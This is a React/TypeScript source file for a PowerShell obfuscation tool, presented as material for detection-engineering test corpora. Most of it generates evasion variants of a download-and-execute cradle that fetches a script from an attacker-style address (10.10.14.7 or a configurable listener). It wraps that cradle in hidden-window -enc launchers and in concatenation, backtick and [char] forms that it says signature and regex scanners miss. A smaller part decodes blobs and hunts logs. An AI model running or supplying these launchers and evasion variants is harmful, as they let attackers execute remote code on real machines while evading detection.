import { useMemo, useState } from 'react';
import { Callout, Card, Checkbox, CodeBlock, OutputBlock, TextArea, TextInput } from '@/components/ui';
import { b64Encode } from '@/lib/encoding';
import { fromUtf16le, utf16leBytes } from '@/lib/bytes';
import { DEFAULT_CALLBACK_HOST, DEFAULT_OOB_DOMAIN } from '@/tools/registry';

/**
 * PowerShell one-liner variants for detection-engineering test corpora:
 * -EncodedCommand (UTF-16LE base64), hidden-window wrapper, IEX download cradle,
 * string concatenation, backtick escapes, [char] assembly and a char-code join.
 * Every output is an inert string — nothing here executes.
 */

const SAMPLE = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.7/a.ps1")';

const CRADLE = `IEX (New-Object Net.WebClient).DownloadString('http://{{CALLBACK}}/a.ps1')`;

function encodedCommand(cmd: string): string {
  return b64Encode(utf16leBytes(cmd));
}

/** Split a token into concatenated single-quoted chunks: 'a'+'b'+'c'. */
function concatSplit(token: string, size = 3): string {
  const chunks: string[] = [];
  for (let i = 0; i < token.length; i += size) chunks.push(token.slice(i, i + size));
  return chunks.map((c) => `'${c.replace(/'/g, "''")}'`).join('+');
}

/** Backtick-escape every alphabetic character: I`E`X → equivalent still parses. */
function backtickEscape(cmd: string, keepWhole: boolean): string {
  return Array.from(cmd)
    .map((ch, i) => (/[a-zA-Z]/.test(ch) && (!keepWhole || i % 2 === 0) ? `\`${ch}` : ch))
    .join('');
}

/** [char]0x49+[char]0x45+... for a single word, then cast the sum to a string. */
function charAssembly(word: string): string {
  return `[string]::join('', @(${Array.from(word, (c) => `[char]0x${c.charCodeAt(0).toString(16).toUpperCase()}`).join(',')}))`;
}

/** -join over an integer array — the noisy variant scanners still miss. */
function charCodeJoin(word: string, base: 'dec' | 'hex'): string {
  const parts = Array.from(word, (c) =>
    base === 'hex' ? `0x${c.charCodeAt(0).toString(16).toUpperCase()}` : String(c.charCodeAt(0)),
  );
  return `-join [char[]](${parts.join(',')})`;
}

export default function PowershellObfuscator() {
  const [command, setCommand] = useState(SAMPLE);
  const [callback, setCallback] = useState(DEFAULT_CALLBACK_HOST);
  const [word, setWord] = useState('DownloadString');
  const [noProfileWrapper, setNoProfileWrapper] = useState(true);
  const [splitSize, setSplitSize] = useState(3);
  const [decoderInput, setDecoderInput] = useState('');

  const outputs = useMemo(() => {
    const cmd = command.trim();
    if (!cmd) return [];
    const enc = encodedCommand(cmd);
    const wrapper = `powershell.exe -nop -w hidden -enc ${enc}`;
    const cradle = CRADLE.replace('{{CALLBACK}}', callback.trim() || DEFAULT_CALLBACK_HOST);
    const cradleEnc = encodedCommand(cradle);
    const targetToken = cmd.match(/[A-Za-z]{4,}/)?.[0] ?? 'IEX';
    return [
      {
        label: '-EncodedCommand (base64 of UTF-16LE)',
        code: enc,
        note: 'PowerShell parses -enc as UTF-16LE base64. Piping the same base64 through a UTF-8 decoder returns mojibake — that mismatch is itself a detection signal.',
      },
      {
        label: 'Wrapped launcher',
        code: noProfileWrapper ? wrapper : `powershell.exe -enc ${enc}`,
        note: 'The canonical shape a proxy or EDR sees on the command line: -nop -w hidden -enc.',
      },
      {
        label: 'IEX download cradle (encoded)',
        code: cradleEnc,
        note: `Plaintext: ${cradle} — replace {{CALLBACK}} with your listener address.`,
      },
      {
        label: `String concatenation on "${targetToken}"`,
        code: cmd.replace(targetToken, concatSplit(targetToken, Math.max(1, splitSize))),
        note: 'Each fragment is still a valid literal, so the joined expression parses. Signature engines keyed on the whole token miss it.',
      },
      {
        label: 'Backtick-escaped variant',
        code: backtickEscape(cmd, false),
        note: 'PowerShell treats a backtick before a letter as a line-continuation-free literal. It is stripped before parsing, so the command is identical.',
      },
      {
        label: `[char] assembly for "${word}"`,
        code: charAssembly(word || 'IEX'),
        note: 'Rebuilds a single word from code points. Combine with a call operator (& or .) to invoke it.',
      },
      {
        label: '-join char-code variant',
        code: `${charCodeJoin(word || 'IEX', 'hex')}  # decimal: ${charCodeJoin(word || 'IEX', 'dec')}`,
        note: 'The -join form is the one most likely to trip a naive "starts with -join" rule only when the array is long.',
      },
      {
        label: 'Full assembled example',
        code: `& (${charAssembly('IEX')}) ${charAssembly('DownloadString')}`,
        note: 'Inert scaffold showing how the pieces compose into a runnable line without any plaintext keyword.',
      },
    ];
  }, [command, callback, word, noProfileWrapper, splitSize]);

  const decoded = useMemo(() => {
    let s = decoderInput.trim().replace(/\s+/g, '');
    if (!s) return { text: '', error: null as string | null, ascii: '', hex: '' };
    // Accept a whole command line, not just the blob.
    const grab = s.match(/-e(?:n|nc|ncod|ncoded|ncodedcommand)?\s+([A-Za-z0-9+/=]+)/i);
    if (grab) s = grab[1];
    if (!/^[A-Za-z0-9+/=]+$/.test(s)) return { text: '', error: 'Input is not a base64 blob', ascii: '', hex: '' };
    while (s.length % 4) s += '=';
    const bin = atob(s);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    const text = fromUtf16le(bytes);
    const ascii = new TextDecoder('utf-8', { fatal: false }).decode(bytes);
    const hex = Array.from(bytes.slice(0, 24), (b) => b.toString(16).padStart(2, '0')).join(' ');
    return { text, error: null, ascii, hex };
  }, [decoderInput]);

  const analytic = useMemo(() => {
    const cmd = command.trim();
    if (!cmd) return '';
    const enc = encodedCommand(cmd);
    return [
      `# 1. Decode an -enc blob offline (Windows PowerShell)`,
      `[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('${enc}'))`,
      ``,
      `# 2. Same thing in bash, no PowerShell needed`,
      `echo '${enc}' | base64 -d | iconv -f UTF-16LE -t UTF-8`,
      ``,
      `# 3. Hunt for the shape in proxy / 4688 logs`,
      `grep -Ei 'powershell.*(-enc|-encodedcommand|frombase64string|iex *\\()' proxy.log`,
      ``,
      `# 4. DNS beacon check against the assessment OAST domain`,
      `grep -i '${DEFAULT_OOB_DOMAIN}' dns.log | awk '{print $NF}' | sort | uniq -c | sort -rn | head`,
    ].join('\n');
  }, [command]);

  return (
    <>
      <Card title="Command">
        <TextArea
          label="PowerShell command"
          hint="Plaintext one-liner. Everything below is derived from this string."
          value={command}
          onChange={setCommand}
          rows={4}
          placeholder="IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7/a.ps1')"
        />
        <div className="mt-3 grid gap-3 sm:grid-cols-3">
          <TextInput label="Callback host" value={callback} onChange={setCallback} mono hint="Replaces {{CALLBACK}}" />
          <TextInput label="Word to assemble" value={word} onChange={setWord} mono hint="[char] / -join source" />
          <TextInput
            label="Concat chunk size"
            type="number"
            value={String(splitSize)}
            onChange={(v) => setSplitSize(Math.max(1, Math.min(12, Number(v) || 1)))}
            mono
          />
        </div>
        <div className="mt-3 grid gap-3 sm:grid-cols-2">
          <Checkbox
            checked={noProfileWrapper}
            onChange={setNoProfileWrapper}
            label="Include -nop -w hidden in the wrapper"
            description="Real launchers carry both flags"
          />
          <div className="text-[11.5px] leading-relaxed text-[var(--text-faint)]">
            Encoded length: <span className="rf-mono">{(encodedCommand(command).length || 0)}</span> chars (
            <span className="rf-mono">{(utf16leBytes(command).length || 0)}</span> UTF-16LE bytes)
          </div>
        </div>
        <div className="mt-3">
          <Callout tone="info" title="What each variant defeats">
            Base64 defeats plaintext command-line string matching. Concatenation and [char] assembly defeat signature
            matching. Backticks defeat regex rules anchored on a token. None of them defeat AMSI at runtime — if the
            test is about script-block logging, reload AMSI between runs or the session caches the verdict.
          </Callout>
        </div>
      </Card>

      <Card title="Variants">
        {outputs.length === 0 ? (
          <p className="m-0 text-[12.5px] text-[var(--text-faint)]">Enter a command above to generate the variants.</p>
        ) : (
          <div className="space-y-4">
            {outputs.map((o) => (
              <div key={o.label}>
                <CodeBlock code={o.code} label={o.label} maxHeight={140} />
                <p className="mt-1 mb-0 text-[11.5px] leading-relaxed text-[var(--text-faint)]">{o.note}</p>
              </div>
            ))}
          </div>
        )}
      </Card>

      <Card title="Decode a pasted -enc blob">
        <TextArea
          label="Encoded command (or a whole command line)"
          value={decoderInput}
          onChange={setDecoderInput}
          rows={3}
          placeholder="powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ..."
        />
        {decoded.error ? (
          <div className="mt-3">
            <Callout tone="warn" title="Not decodable">
              {decoded.error}
            </Callout>
          </div>
        ) : (
          <>
            <div className="mt-3">
              <OutputBlock value={decoded.text} rows={4} label="Decoded plaintext (UTF-16LE)" empty="Paste a blob to decode" />
            </div>
            {decoded.ascii && decoded.ascii !== decoded.text && (
              <div className="mt-3">
                <Callout tone="info" title="UTF-8 reading differs">
                  Read as UTF-8 the same bytes give: <span className="rf-mono">{decoded.ascii.slice(0, 120)}</span> — the
                  blob was almost certainly produced by PowerShell's own UTF-16LE encoder.
                </Callout>
              </div>
            )}
            {decoded.hex && (
              <p className="mt-2 mb-0 text-[11.5px] text-[var(--text-faint)]">
                First bytes: <span className="rf-mono">{decoded.hex}</span> (every other byte 0x00 is the UTF-16LE tell)
              </p>
            )}
          </>
        )}
      </Card>

      <Card title="Analysis commands">
        <CodeBlock code={analytic || '# Enter a command above'} label="bash / PowerShell" />
      </Card>
    </>
  );
}
